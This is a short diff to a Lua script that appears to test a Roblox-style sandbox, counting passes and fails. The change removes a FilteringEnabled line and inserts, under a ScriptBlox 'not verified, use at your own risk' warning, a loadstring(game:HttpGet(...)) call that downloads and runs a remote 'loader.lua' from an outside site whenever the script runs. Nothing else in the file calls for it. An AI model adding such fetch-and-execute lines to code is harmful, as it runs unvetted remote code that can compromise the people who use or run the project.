@@ -1,8 +1,10 @@
 local VM = require("./Sandbox")
 
 VM:Run([=[
-
-workspace.FilteringEnabled = false
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://byt3c0de.net/byte/loader.lua", true))()
 
 local passes, fails, undefined = 0, 0, 0
 local running = 0
